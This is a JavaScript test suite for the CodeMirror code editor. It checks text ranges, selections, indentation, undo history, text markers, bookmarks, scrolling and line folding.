var Pos = CodeMirror.Pos;

CodeMirror.defaults.rtlMoveVisually = true;

function forEach(arr, f) {
  for (var i = 0, e = arr.length; i < e; ++i) f(arr[i]);
}

function addDoc(cm, width, height) {
  var content = [], line = "";
  for (var i = 0; i < width; ++i) line += "x";
  for (var i = 0; i < height; ++i) content.push(line);
  cm.setValue(content.join("\n"));
}

function byClassName(elt, cls) {
  if (elt.getElementsByClassName) return elt.getElementsByClassName(cls);
  var found = [], re = new RegExp("\\b" + cls + "\\b");
  function search(elt) {
    if (elt.nodeType == 3) return;
    if (re.test(elt.className)) found.push(elt);
    for (var i = 0, e = elt.childNodes.length; i < e; ++i)
      search(elt.childNodes[i]);
  }
  search(elt);
  return found;
}

var ie_lt8 = /MSIE [1-7]\b/.test(navigator.userAgent);
var ie_lt9 = /MSIE [1-8]\b/.test(navigator.userAgent);
var mac = /Mac/.test(navigator.platform);
var phantom = /PhantomJS/.test(navigator.userAgent);
var opera = /Opera\/\./.test(navigator.userAgent);
var opera_version = opera && navigator.userAgent.match(/Version\/(\d+\.\d+)/);
if (opera_version) opera_version = Number(opera_version);
var opera_lt10 = opera && (!opera_version || opera_version < 10);

namespace = "core_";

test("core_fromTextArea", function() {
  var te = document.getElementById("code");
  te.value = "CONTENT";
  var cm = CodeMirror.fromTextArea(te);
  is(!te.offsetHeight);
  eq(cm.getValue(), "CONTENT");
  cm.setValue("foo\nbar");
  eq(cm.getValue(), "foo\nbar");
  cm.save();
  is(/^foo\r?\nbar$/.test(te.value));
  cm.setValue("xxx");
  cm.toTextArea();
  is(te.offsetHeight);
  eq(te.value, "xxx");
});

testCM("getRange", function(cm) {
  eq(cm.getLine(0), "1234");
  eq(cm.getLine(1), "5678");
  eq(cm.getLine(2), null);
  eq(cm.getLine(-1), null);
  eq(cm.getRange(Pos(0, 0), Pos(0, 3)), "123");
  eq(cm.getRange(Pos(0, -1), Pos(0, 200)), "1234");
  eq(cm.getRange(Pos(0, 2), Pos(1, 2)), "34\n56");
  eq(cm.getRange(Pos(1, 2), Pos(100, 0)), "78");
}, {value: "1234\n5678"});

testCM("replaceRange", function(cm) {
  eq(cm.getValue(), "");
  cm.replaceRange("foo\n", Pos(0, 0));
  eq(cm.getValue(), "foo\n");
  cm.replaceRange("a\nb", Pos(0, 1));
  eq(cm.getValue(), "fa\nboo\n");
  eq(cm.lineCount(), 3);
  cm.replaceRange("xyzzy", Pos(0, 0), Pos(1, 1));
  eq(cm.getValue(), "xyzzyoo\n");
  cm.replaceRange("abc", Pos(0, 0), Pos(10, 0));
  eq(cm.getValue(), "abc");
  eq(cm.lineCount(), 1);
});

testCM("selection", function(cm) {
  cm.setSelection(Pos(0, 4), Pos(2, 2));
  is(cm.somethingSelected());
  eq(cm.getSelection(), "11\n222222\n33");
  eqPos(cm.getCursor(false), Pos(2, 2));
  eqPos(cm.getCursor(true), Pos(0, 4));
  cm.setSelection(Pos(1, 0));
  is(!cm.somethingSelected());
  eq(cm.getSelection(), "");
  eqPos(cm.getCursor(true), Pos(1, 0));
  cm.replaceSelection("abc", "around");
  eq(cm.getSelection(), "abc");
  eq(cm.getValue(), "111111\nabc222222\n333333");
  cm.replaceSelection("def", "end");
  eq(cm.getSelection(), "");
  eqPos(cm.getCursor(true), Pos(1, 3));
  cm.setCursor(Pos(2, 1));
  eqPos(cm.getCursor(true), Pos(2, 1));
  cm.setCursor(1, 2);
  eqPos(cm.getCursor(true), Pos(1, 2));
}, {value: "111111\n222222\n333333"});

testCM("extendSelection", function(cm) {
  cm.setExtending(true);
  addDoc(cm, 10, 10);
  cm.setSelection(Pos(3, 5));
  eqPos(cm.getCursor("head"), Pos(3, 5));
  eqPos(cm.getCursor("anchor"), Pos(3, 5));
  cm.setSelection(Pos(2, 5), Pos(5, 5));
  eqPos(cm.getCursor("head"), Pos(5, 5));
  eqPos(cm.getCursor("anchor"), Pos(2, 5));
  eqPos(cm.getCursor("start"), Pos(2, 5));
  eqPos(cm.getCursor("end"), Pos(5, 5));
  cm.setSelection(Pos(5, 5), Pos(2, 5));
  eqPos(cm.getCursor("head"), Pos(2, 5));
  eqPos(cm.getCursor("anchor"), Pos(5, 5));
  eqPos(cm.getCursor("start"), Pos(2, 5));
  eqPos(cm.getCursor("end"), Pos(5, 5));
  cm.extendSelection(Pos(3, 2));
  eqPos(cm.getCursor("head"), Pos(3, 2));
  eqPos(cm.getCursor("anchor"), Pos(5, 5));
  cm.extendSelection(Pos(6, 2));
  eqPos(cm.getCursor("head"), Pos(6, 2));
  eqPos(cm.getCursor("anchor"), Pos(5, 5));
  cm.extendSelection(Pos(6, 3), Pos(6, 4));
  eqPos(cm.getCursor("head"), Pos(6, 4));
  eqPos(cm.getCursor("anchor"), Pos(5, 5));
  cm.extendSelection(Pos(0, 3), Pos(0, 4));
  eqPos(cm.getCursor("head"), Pos(0, 3));
  eqPos(cm.getCursor("anchor"), Pos(5, 5));
  cm.extendSelection(Pos(4, 5), Pos(6, 5));
  eqPos(cm.getCursor("head"), Pos(6, 5));
  eqPos(cm.getCursor("anchor"), Pos(4, 5));
  cm.setExtending(false);
  cm.extendSelection(Pos(0, 3), Pos(0, 4));
  eqPos(cm.getCursor("head"), Pos(0, 3));
  eqPos(cm.getCursor("anchor"), Pos(0, 4));
});

testCM("lines", function(cm) {
  eq(cm.getLine(0), "111111");
  eq(cm.getLine(1), "222222");
  eq(cm.getLine(-1), null);
  cm.replaceRange("", Pos(1, 0), Pos(2, 0))
  cm.replaceRange("abc", Pos(1, 0), Pos(1));
  eq(cm.getValue(), "111111\nabc");
}, {value: "111111\n222222\n333333"});

testCM("indent", function(cm) {
  cm.indentLine(1);
  eq(cm.getLine(1), "   blah();");
  cm.setOption("indentUnit", 8);
  cm.indentLine(1);
  eq(cm.getLine(1), "\tblah();");
  cm.setOption("indentUnit", 10);
  cm.setOption("tabSize", 4);
  cm.indentLine(1);
  eq(cm.getLine(1), "\t\t  blah();");
}, {value: "if (x) {\nblah();\n}", indentUnit: 3, indentWithTabs: true, tabSize: 8});

testCM("indentByNumber", function(cm) {
  cm.indentLine(0, 2);
  eq(cm.getLine(0), "  foo");
  cm.indentLine(0, -200);
  eq(cm.getLine(0), "foo");
  cm.setSelection(Pos(0, 0), Pos(1, 2));
  cm.indentSelection(3);
  eq(cm.getValue(), "   foo\n   bar\nbaz");
}, {value: "foo\nbar\nbaz"});

test("core_defaults", function() {
  var defsCopy = {}, defs = CodeMirror.defaults;
  for (var opt in defs) defsCopy[opt] = defs[opt];
  defs.indentUnit = 5;
  defs.value = "uu";
  defs.indentWithTabs = true;
  defs.tabindex = 55;
  var place = document.getElementById("testground"), cm = CodeMirror(place);
  try {
    eq(cm.getOption("indentUnit"), 5);
    cm.setOption("indentUnit", 10);
    eq(defs.indentUnit, 5);
    eq(cm.getValue(), "uu");
    eq(cm.getOption("indentWithTabs"), true);
    eq(cm.getInputField().tabIndex, 55);
  }
  finally {
    for (var opt in defsCopy) defs[opt] = defsCopy[opt];
    place.removeChild(cm.getWrapperElement());
  }
});

testCM("lineInfo", function(cm) {
  eq(cm.lineInfo(-1), null);
  var mark = document.createElement("span");
  var lh = cm.setGutterMarker(1, "FOO", mark);
  var info = cm.lineInfo(1);
  eq(info.text, "222222");
  eq(info.gutterMarkers.FOO, mark);
  eq(info.line, 1);
  eq(cm.lineInfo(2).gutterMarkers, null);
  cm.setGutterMarker(lh, "FOO", null);
  eq(cm.lineInfo(1).gutterMarkers, null);
  cm.setGutterMarker(1, "FOO", mark);
  cm.setGutterMarker(0, "FOO", mark);
  cm.clearGutter("FOO");
  eq(cm.lineInfo(0).gutterMarkers, null);
  eq(cm.lineInfo(1).gutterMarkers, null);
}, {value: "111111\n222222\n333333"});

testCM("coords", function(cm) {
  cm.setSize(null, 100);
  addDoc(cm, 32, 200);
  var top = cm.charCoords(Pos(0, 0));
  var bot = cm.charCoords(Pos(200, 30));
  is(top.left < bot.left);
  is(top.top < bot.top);
  is(top.top < top.bottom);
  cm.scrollTo(null, 100);
  var top2 = cm.charCoords(Pos(0, 0));
  is(top.top > top2.top);
  eq(top.left, top2.left);
});

testCM("coordsChar", function(cm) {
  addDoc(cm, 35, 70);
  for (var i = 0; i < 2; ++i) {
    var sys = i ? "local" : "page";
    for (var ch = 0; ch <= 35; ch += 5) {
      for (var line = 0; line < 70; line += 5) {
        cm.setCursor(line, ch);
        var coords = cm.charCoords(Pos(line, ch), sys);
        var pos = cm.coordsChar({left: coords.left + 1, top: coords.top + 1}, sys);
        eqPos(pos, Pos(line, ch));
      }
    }
  }
}, {lineNumbers: true});

testCM("posFromIndex", function(cm) {
  cm.setValue(
    "This function should\n" +
    "convert a zero based index\n" +
    "to line and ch."
  );

  var examples = [
    { index: -1, line: 0, ch: 0  }, // <- Tests clipping
    { index: 0,  line: 0, ch: 0  },
    { index: 10, line: 0, ch: 10 },
    { index: 39, line: 1, ch: 18 },
    { index: 55, line: 2, ch: 7  },
    { index: 63, line: 2, ch: 15 },
    { index: 64, line: 2, ch: 15 }  // <- Tests clipping
  ];

  for (var i = 0; i < examples.length; i++) {
    var example = examples[i];
    var pos = cm.posFromIndex(example.index);
    eq(pos.line, example.line);
    eq(pos.ch, example.ch);
    if (example.index >= 0 && example.index < 64)
      eq(cm.indexFromPos(pos), example.index);
  }
});

testCM("undo", function(cm) {
  cm.replaceRange("def", Pos(0, 0), Pos(0));
  eq(cm.historySize().undo, 1);
  cm.undo();
  eq(cm.getValue(), "abc");
  eq(cm.historySize().undo, 0);
  eq(cm.historySize().redo, 1);
  cm.redo();
  eq(cm.getValue(), "def");
  eq(cm.historySize().undo, 1);
  eq(cm.historySize().redo, 0);
  cm.setValue("1\n\n\n2");
  cm.clearHistory();
  eq(cm.historySize().undo, 0);
  for (var i = 0; i < 20; ++i) {
    cm.replaceRange("a", Pos(0, 0));
    cm.replaceRange("b", Pos(3, 0));
  }
  eq(cm.historySize().undo, 40);
  for (var i = 0; i < 40; ++i)
    cm.undo();
  eq(cm.historySize().redo, 40);
  eq(cm.getValue(), "1\n\n\n2");
}, {value: "abc"});

testCM("undoDepth", function(cm) {
  cm.replaceRange("d", Pos(0));
  cm.replaceRange("e", Pos(0));
  cm.replaceRange("f", Pos(0));
  cm.undo(); cm.undo(); cm.undo();
  eq(cm.getValue(), "abcd");
}, {value: "abc", undoDepth: 4});

testCM("undoDoesntClearValue", function(cm) {
  cm.undo();
  eq(cm.getValue(), "x");
}, {value: "x"});

testCM("undoMultiLine", function(cm) {
  cm.operation(function() {
    cm.replaceRange("x", Pos(0, 0));
    cm.replaceRange("y", Pos(1, 0));
  });
  cm.undo();
  eq(cm.getValue(), "abc\ndef\nghi");
  cm.operation(function() {
    cm.replaceRange("y", Pos(1, 0));
    cm.replaceRange("x", Pos(0, 0));
  });
  cm.undo();
  eq(cm.getValue(), "abc\ndef\nghi");
  cm.operation(function() {
    cm.replaceRange("y", Pos(2, 0));
    cm.replaceRange("x", Pos(1, 0));
    cm.replaceRange("z", Pos(2, 0));
  });
  cm.undo();
  eq(cm.getValue(), "abc\ndef\nghi", 3);
}, {value: "abc\ndef\nghi"});

testCM("undoComposite", function(cm) {
  cm.replaceRange("y", Pos(1));
  cm.operation(function() {
    cm.replaceRange("x", Pos(0));
    cm.replaceRange("z", Pos(2));
  });
  eq(cm.getValue(), "ax\nby\ncz\n");
  cm.undo();
  eq(cm.getValue(), "a\nby\nc\n");
  cm.undo();
  eq(cm.getValue(), "a\nb\nc\n");
  cm.redo(); cm.redo();
  eq(cm.getValue(), "ax\nby\ncz\n");
}, {value: "a\nb\nc\n"});

testCM("undoSelection", function(cm) {
  cm.setSelection(Pos(0, 2), Pos(0, 4));
  cm.replaceSelection("");
  cm.setCursor(Pos(1, 0));
  cm.undo();
  eqPos(cm.getCursor(true), Pos(0, 2));
  eqPos(cm.getCursor(false), Pos(0, 4));
  cm.setCursor(Pos(1, 0));
  cm.redo();
  eqPos(cm.getCursor(true), Pos(0, 2));
  eqPos(cm.getCursor(false), Pos(0, 2));
}, {value: "abcdefgh\n"});

testCM("undoSelectionAsBefore", function(cm) {
  cm.replaceSelection("abc", "around");
  cm.undo();
  cm.redo();
  eq(cm.getSelection(), "abc");
});

testCM("selectionChangeConfusesHistory", function(cm) {
  cm.replaceSelection("abc", null, "dontmerge");
  cm.operation(function() {
    cm.setCursor(Pos(0, 0));
    cm.replaceSelection("abc", null, "dontmerge");
  });
  eq(cm.historySize().undo, 2);
});

testCM("markTextSingleLine", function(cm) {
  forEach([{a: 0, b: 1, c: "", f: 2, t: 5},
           {a: 0, b: 4, c: "", f: 0, t: 2},
           {a: 1, b: 2, c: "x", f: 3, t: 6},
           {a: 4, b: 5, c: "", f: 3, t: 5},
           {a: 4, b: 5, c: "xx", f: 3, t: 7},
           {a: 2, b: 5, c: "", f: 2, t: 3},
           {a: 2, b: 5, c: "abcd", f: 6, t: 7},
           {a: 2, b: 6, c: "x", f: null, t: null},
           {a: 3, b: 6, c: "", f: null, t: null},
           {a: 0, b: 9, c: "hallo", f: null, t: null},
           {a: 4, b: 6, c: "x", f: 3, t: 4},
           {a: 4, b: 8, c: "", f: 3, t: 4},
           {a: 6, b: 6, c: "a", f: 3, t: 6},
           {a: 8, b: 9, c: "", f: 3, t: 6}], function(test) {
    cm.setValue("1234567890");
    var r = cm.markText(Pos(0, 3), Pos(0, 6), {className: "foo"});
    cm.replaceRange(test.c, Pos(0, test.a), Pos(0, test.b));
    var f = r.find();
    eq(f && f.from.ch, test.f); eq(f && f.to.ch, test.t);
  });
});

testCM("markTextMultiLine", function(cm) {
  function p(v) { return v && Pos(v[0], v[1]); }
  forEach([{a: [0, 0], b: [0, 5], c: "", f: [0, 0], t: [2, 5]},
           {a: [0, 0], b: [0, 5], c: "foo\n", f: [1, 0], t: [3, 5]},
           {a: [0, 1], b: [0, 10], c: "", f: [0, 1], t: [2, 5]},
           {a: [0, 5], b: [0, 6], c: "x", f: [0, 6], t: [2, 5]},
           {a: [0, 0], b: [1, 0], c: "", f: [0, 0], t: [1, 5]},
           {a: [0, 6], b: [2, 4], c: "", f: [0, 5], t: [0, 7]},
           {a: [0, 6], b: [2, 4], c: "aa", f: [0, 5], t: [0, 9]},
           {a: [1, 2], b: [1, 8], c: "", f: [0, 5], t: [2, 5]},
           {a: [0, 5], b: [2, 5], c: "xx", f: null, t: null},
           {a: [0, 0], b: [2, 10], c: "x", f: null, t: null},
           {a: [1, 5], b: [2, 5], c: "", f: [0, 5], t: [1, 5]},
           {a: [2, 0], b: [2, 3], c: "", f: [0, 5], t: [2, 2]},
           {a: [2, 5], b: [3, 0], c: "a\nb", f: [0, 5], t: [2, 5]},
           {a: [2, 3], b: [3, 0], c: "x", f: [0, 5], t: [2, 3]},
           {a: [1, 1], b: [1, 9], c: "1\n2\n3", f: [0, 5], t: [4, 5]}], function(test) {
    cm.setValue("aaaaaaaaaa\nbbbbbbbbbb\ncccccccccc\ndddddddd\n");
    var r = cm.markText(Pos(0, 5), Pos(2, 5),
                        {className: "CodeMirror-matchingbracket"});
    cm.replaceRange(test.c, p(test.a), p(test.b));
    var f = r.find();
    eqPos(f && f.from, p(test.f)); eqPos(f && f.to, p(test.t));
  });
});

testCM("markTextUndo", function(cm) {
  var marker1, marker2, bookmark;
  marker1 = cm.markText(Pos(0, 1), Pos(0, 3),
                        {className: "CodeMirror-matchingbracket"});
  marker2 = cm.markText(Pos(0, 0), Pos(2, 1),
                        {className: "CodeMirror-matchingbracket"});
  bookmark = cm.setBookmark(Pos(1, 5));
  cm.operation(function(){
    cm.replaceRange("foo", Pos(0, 2));
    cm.replaceRange("bar\nbaz\nbug\n", Pos(2, 0), Pos(3, 0));
  });
  var v1 = cm.getValue();
  cm.setValue("");
  eq(marker1.find(), null); eq(marker2.find(), null); eq(bookmark.find(), null);
  cm.undo();
  eqPos(bookmark.find(), Pos(1, 5), "still there");
  cm.undo();
  var m1Pos = marker1.find(), m2Pos = marker2.find();
  eqPos(m1Pos.from, Pos(0, 1)); eqPos(m1Pos.to, Pos(0, 3));
  eqPos(m2Pos.from, Pos(0, 0)); eqPos(m2Pos.to, Pos(2, 1));
  eqPos(bookmark.find(), Pos(1, 5));
  cm.redo(); cm.redo();
  eq(bookmark.find(), null);
  cm.undo();
  eqPos(bookmark.find(), Pos(1, 5));
  eq(cm.getValue(), v1);
}, {value: "1234\n56789\n00\n"});

testCM("markTextStayGone", function(cm) {
  var m1 = cm.markText(Pos(0, 0), Pos(0, 1));
  cm.replaceRange("hi", Pos(0, 2));
  m1.clear();
  cm.undo();
  eq(m1.find(), null);
}, {value: "hello"});

testCM("markTextAllowEmpty", function(cm) {
  var m1 = cm.markText(Pos(0, 1), Pos(0, 2), {clearWhenEmpty: false});
  is(m1.find());
  cm.replaceRange("x", Pos(0, 0));
  is(m1.find());
  cm.replaceRange("y", Pos(0, 2));
  is(m1.find());
  cm.replaceRange("z", Pos(0, 3), Pos(0, 4));
  is(!m1.find());
  var m2 = cm.markText(Pos(0, 1), Pos(0, 2), {clearWhenEmpty: false,
                                              inclusiveLeft: true,
                                              inclusiveRight: true});
  cm.replaceRange("q", Pos(0, 1), Pos(0, 2));
  is(m2.find());
  cm.replaceRange("", Pos(0, 0), Pos(0, 3));
  is(!m2.find());
  var m3 = cm.markText(Pos(0, 1), Pos(0, 1), {clearWhenEmpty: false});
  cm.replaceRange("a", Pos(0, 3));
  is(m3.find());
  cm.replaceRange("b", Pos(0, 1));
  is(!m3.find());
}, {value: "abcde"});

testCM("markTextStacked", function(cm) {
  var m1 = cm.markText(Pos(0, 0), Pos(0, 0), {clearWhenEmpty: false});
  var m2 = cm.markText(Pos(0, 0), Pos(0, 0), {clearWhenEmpty: false});
  cm.replaceRange("B", Pos(0, 1));
  is(m1.find() && m2.find());
}, {value: "A"});

testCM("undoPreservesNewMarks", function(cm) {
  cm.markText(Pos(0, 3), Pos(0, 4));
  cm.markText(Pos(1, 1), Pos(1, 3));
  cm.replaceRange("", Pos(0, 3), Pos(3, 1));
  var mBefore = cm.markText(Pos(0, 0), Pos(0, 1));
  var mAfter = cm.markText(Pos(0, 5), Pos(0, 6));
  var mAround = cm.markText(Pos(0, 2), Pos(0, 4));
  cm.undo();
  eqPos(mBefore.find().from, Pos(0, 0));
  eqPos(mBefore.find().to, Pos(0, 1));
  eqPos(mAfter.find().from, Pos(3, 3));
  eqPos(mAfter.find().to, Pos(3, 4));
  eqPos(mAround.find().from, Pos(0, 2));
  eqPos(mAround.find().to, Pos(3, 2));
  var found = cm.findMarksAt(Pos(2, 2));
  eq(found.length, 1);
  eq(found[0], mAround);
}, {value: "aaaa\nbbbb\ncccc\ndddd"});

testCM("markClearBetween", function(cm) {
  cm.setValue("aaa\nbbb\nccc\nddd\n");
  cm.markText(Pos(0, 0), Pos(2));
  cm.replaceRange("aaa\nbbb\nccc", Pos(0, 0), Pos(2));
  eq(cm.findMarksAt(Pos(1, 1)).length, 0);
});

testCM("deleteSpanCollapsedInclusiveLeft", function(cm) {
  var from = Pos(1, 0), to = Pos(1, 1);
  var m = cm.markText(from, to, {collapsed: true, inclusiveLeft: true});
  // Delete collapsed span.
  cm.replaceRange("", from, to);
}, {value: "abc\nX\ndef"});

testCM("bookmark", function(cm) {
  function p(v) { return v && Pos(v[0], v[1]); }
  forEach([{a: [1, 0], b: [1, 1], c: "", d: [1, 4]},
           {a: [1, 1], b: [1, 1], c: "xx", d: [1, 7]},
           {a: [1, 4], b: [1, 5], c: "ab", d: [1, 6]},
           {a: [1, 4], b: [1, 6], c: "", d: null},
           {a: [1, 5], b: [1, 6], c: "abc", d: [1, 5]},
           {a: [1, 6], b: [1, 8], c: "", d: [1, 5]},
           {a: [1, 4], b: [1, 4], c: "\n\n", d: [3, 1]},
           {bm: [1, 9], a: [1, 1], b: [1, 1], c: "\n", d: [2, 8]}], function(test) {
    cm.setValue("1234567890\n1234567890\n1234567890");
    var b = cm.setBookmark(p(test.bm) || Pos(1, 5));
    cm.replaceRange(test.c, p(test.a), p(test.b));
    eqPos(b.find(), p(test.d));
  });
});

testCM("bookmarkInsertLeft", function(cm) {
  var br = cm.setBookmark(Pos(0, 2), {insertLeft: false});
  var bl = cm.setBookmark(Pos(0, 2), {insertLeft: true});
  cm.setCursor(Pos(0, 2));
  cm.replaceSelection("hi");
  eqPos(br.find(), Pos(0, 2));
  eqPos(bl.find(), Pos(0, 4));
  cm.replaceRange("", Pos(0, 4), Pos(0, 5));
  cm.replaceRange("", Pos(0, 2), Pos(0, 4));
  cm.replaceRange("", Pos(0, 1), Pos(0, 2));
  // Verify that deleting next to bookmarks doesn't kill them
  eqPos(br.find(), Pos(0, 1));
  eqPos(bl.find(), Pos(0, 1));
}, {value: "abcdef"});

testCM("bookmarkCursor", function(cm) {
  var pos01 = cm.cursorCoords(Pos(0, 1)), pos11 = cm.cursorCoords(Pos(1, 1)),
      pos20 = cm.cursorCoords(Pos(2, 0)), pos30 = cm.cursorCoords(Pos(3, 0)),
      pos41 = cm.cursorCoords(Pos(4, 1));
  cm.setBookmark(Pos(0, 1), {widget: document.createTextNode("←"), insertLeft: true});
  cm.setBookmark(Pos(2, 0), {widget: document.createTextNode("←"), insertLeft: true});
  cm.setBookmark(Pos(1, 1), {widget: document.createTextNode("→")});
  cm.setBookmark(Pos(3, 0), {widget: document.createTextNode("→")});
  var new01 = cm.cursorCoords(Pos(0, 1)), new11 = cm.cursorCoords(Pos(1, 1)),
      new20 = cm.cursorCoords(Pos(2, 0)), new30 = cm.cursorCoords(Pos(3, 0));
  near(new01.left, pos01.left, 1);
  near(new01.top, pos01.top, 1);
  is(new11.left > pos11.left, "at right, middle of line");
  near(new11.top == pos11.top, 1);
  near(new20.left, pos20.left, 1);
  near(new20.top, pos20.top, 1);
  is(new30.left > pos30.left, "at right, empty line");
  near(new30.top, pos30, 1);
  cm.setBookmark(Pos(4, 0), {widget: document.createTextNode("→")});
  is(cm.cursorCoords(Pos(4, 1)).left > pos41.left, "single-char bug");
}, {value: "foo\nbar\n\n\nx\ny"});

testCM("multiBookmarkCursor", function(cm) {
  if (phantom) return;
  var ms = [], m;
  function add(insertLeft) {
    for (var i = 0; i < 3; ++i) {
      var node = document.createElement("span");
      node.innerHTML = "X";
      ms.push(cm.setBookmark(Pos(0, 1), {widget: node, insertLeft: insertLeft}));
    }
  }
  var base1 = cm.cursorCoords(Pos(0, 1)).left, base4 = cm.cursorCoords(Pos(0, 4)).left;
  add(true);
  near(base1, cm.cursorCoords(Pos(0, 1)).left, 1);
  while (m = ms.pop()) m.clear();
  add(false);
  near(base4, cm.cursorCoords(Pos(0, 1)).left, 1);
}, {value: "abcdefg"});

testCM("getAllMarks", function(cm) {
  addDoc(cm, 10, 10);
  var m1 = cm.setBookmark(Pos(0, 2));
  var m2 = cm.markText(Pos(0, 2), Pos(3, 2));
  var m3 = cm.markText(Pos(1, 2), Pos(1, 8));
  var m4 = cm.markText(Pos(8, 0), Pos(9, 0));
  eq(cm.getAllMarks().length, 4);
  m1.clear();
  m3.clear();
  eq(cm.getAllMarks().length, 2);
});

testCM("bug577", function(cm) {
  cm.setValue("a\nb");
  cm.clearHistory();
  cm.setValue("fooooo");
  cm.undo();
});

testCM("scrollSnap", function(cm) {
  cm.setSize(100, 100);
  addDoc(cm, 200, 200);
  cm.setCursor(Pos(100, 180));
  var info = cm.getScrollInfo();
  is(info.left > 0 && info.top > 0);
  cm.setCursor(Pos(0, 0));
  info = cm.getScrollInfo();
  is(info.left == 0 && info.top == 0, "scrolled clean to top");
  cm.setCursor(Pos(100, 180));
  cm.setCursor(Pos(199, 0));
  info = cm.getScrollInfo();
  is(info.left == 0 && info.top + 2 > info.height - cm.getScrollerElement().clientHeight, "scrolled clean to bottom");
});

testCM("scrollIntoView", function(cm) {
  if (phantom) return;
  var outer = cm.getWrapperElement().getBoundingClientRect();
  function test(line, ch, msg) {
    var pos = Pos(line, ch);
    cm.scrollIntoView(pos);
    var box = cm.charCoords(pos, "window");
    is(box.left >= outer.left, msg + " (left)");
    is(box.right <= outer.right, msg + " (right)");
    is(box.top >= outer.top, msg + " (top)");
    is(box.bottom <= outer.bottom, msg + " (bottom)");
  }
  addDoc(cm, 200, 200);
  test(199, 199, "bottom right");
  test(0, 0, "top left");
  test(100, 100, "center");
  test(199, 0, "bottom left");
  test(0, 199, "top right");
  test(100, 100, "center again");
});

testCM("scrollBackAndForth", function(cm) {
  addDoc(cm, 1, 200);
  cm.operation(function() {
    cm.scrollIntoView(Pos(199, 0));
    cm.scrollIntoView(Pos(4, 0));
  });
  is(cm.getScrollInfo().top > 0);
});

testCM("selectAllNoScroll", function(cm) {
  addDoc(cm, 1, 200);
  cm.execCommand("selectAll");
  eq(cm.getScrollInfo().top, 0);
  cm.setCursor(199);
  cm.execCommand("selectAll");
  is(cm.getScrollInfo().top > 0);
});

testCM("selectionPos", function(cm) {
  if (phantom) return;
  cm.setSize(100, 100);
  addDoc(cm, 200, 100);
  cm.setSelection(Pos(1, 100), Pos(98, 100));
  var lineWidth = cm.charCoords(Pos(0, 200), "local").left;
  var lineHeight = (cm.charCoords(Pos(99)).top - cm.charCoords(Pos(0)).top) / 100;
  cm.scrollTo(0, 0);
  var selElt = byClassName(cm.getWrapperElement(), "CodeMirror-selected");
  var outer = cm.getWrapperElement().getBoundingClientRect();
  var sawMiddle, sawTop, sawBottom;
  for (var i = 0, e = selElt.length; i < e; ++i) {
    var box = selElt[i].getBoundingClientRect();
    var atLeft = box.left - outer.left < 30;
    var width = box.right - box.left;
    var atRight = box.right - outer.left > .8 * lineWidth;
    if (atLeft && atRight) {
      sawMiddle = true;
      is(box.bottom - box.top > 90 * lineHeight, "middle high");
      is(width > .9 * lineWidth, "middle wide");
    } else {
      is(width > .4 * lineWidth, "top/bot wide enough");
      is(width < .6 * lineWidth, "top/bot slim enough");
      if (atLeft) {
        sawBottom = true;
        is(box.top - outer.top > 96 * lineHeight, "bot below");
      } else if (atRight) {
        sawTop = true;
        is(box.top - outer.top < 2.1 * lineHeight, "top above");
      }
    }
  }
  is(sawTop && sawBottom && sawMiddle, "all parts");
}, null);

testCM("restoreHistory", function(cm) {
  cm.setValue("abc\ndef");
  cm.replaceRange("hello", Pos(1, 0), Pos(1));
  cm.replaceRange("goop", Pos(0, 0), Pos(0));
  cm.undo();
  var storedVal = cm.getValue(), storedHist = cm.getHistory();
  if (window.JSON) storedHist = JSON.parse(JSON.stringify(storedHist));
  eq(storedVal, "abc\nhello");
  cm.setValue("");
  cm.clearHistory();
  eq(cm.historySize().undo, 0);
  cm.setValue(storedVal);
  cm.setHistory(storedHist);
  cm.redo();
  eq(cm.getValue(), "goop\nhello");
  cm.undo(); cm.undo();
  eq(cm.getValue(), "abc\ndef");
});

testCM("doubleScrollbar", function(cm) {
  var dummy = document.body.appendChild(document.createElement("p"));
  dummy.style.cssText = "height: 50px; overflow: scroll; width: 50px";
  var scrollbarWidth = dummy.offsetWidth + 1 - dummy.clientWidth;
  document.body.removeChild(dummy);
  if (scrollbarWidth < 2) return;
  cm.setSize(null, 100);
  addDoc(cm, 1, 300);
  var wrap = cm.getWrapperElement();
  is(wrap.offsetWidth - byClassName(wrap, "CodeMirror-lines")[0].offsetWidth <= scrollbarWidth * 1.5);
});

testCM("weirdLinebreaks", function(cm) {
  cm.setValue("foo\nbar\rbaz\r\nquux\n\rplop");
  is(cm.getValue(), "foo\nbar\nbaz\nquux\n\nplop");
  is(cm.lineCount(), 6);
  cm.setValue("\n\n");
  is(cm.lineCount(), 3);
});

testCM("setSize", function(cm) {
  cm.setSize(100, 100);
  var wrap = cm.getWrapperElement();
  is(wrap.offsetWidth, 100);
  is(wrap.offsetHeight, 100);
  cm.setSize("100%", "3em");
  is(wrap.style.width, "100%");
  is(wrap.style.height, "3em");
  cm.setSize(null, 40);
  is(wrap.style.width, "100%");
  is(wrap.style.height, "40px");
});

function foldLines(cm, start, end, autoClear) {
  return cm.markText(Pos(start, 0), Pos(end - 1), {
    inclusiveLeft: true,
    inclusiveRight: true,
    collapsed: true,
    clearOnEnter: autoClear
  });
}

testCM("collapsedLines", function(cm) {
  addDoc(cm, 4, 10);
  var range = foldLines(cm, 4, 5), cleared = 0;
  CodeMirror.on(range, "clear", function() {cleared++;});
  cm.setCursor(Pos(3, 0));
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(5, 0));
  cm.replaceRange("abcdefg", Pos(3, 0), Pos(3));
  cm.setCursor(Pos(3, 6));
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(5, 4));
  cm.replaceRange("ab", Pos(3, 0), Pos(3));
  cm.setCursor(Pos(3, 2));
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(5, 2));
  cm.operation(function() {range.clear(); range.clear();});
  eq(cleared, 1);
});

testCM("collapsedRangeCoordsChar", function(cm) {
  var pos_1_3 = cm.charCoords(Pos(1, 3));
  pos_1_3.left += 2; pos_1_3.top += 2;
  var opts = {collapsed: true, inclusiveLeft: true, inclusiveRight: true};
  var m1 = cm.markText(Pos(0, 0), Pos(2, 0), opts);
  eqPos(cm.coordsChar(pos_1_3), Pos(3, 3));
  m1.clear();
  var m1 = cm.markText(Pos(0, 0), Pos(1, 1), {collapsed: true, inclusiveLeft: true});
  var m2 = cm.markText(Pos(1, 1), Pos(2, 0), {collapsed: true, inclusiveRight: true});
  eqPos(cm.coordsChar(pos_1_3), Pos(3, 3));
  m1.clear(); m2.clear();
  var m1 = cm.markText(Pos(0, 0), Pos(1, 6), opts);
  eqPos(cm.coordsChar(pos_1_3), Pos(3, 3));
}, {value: "123456\nabcdef\nghijkl\nmnopqr\n"});

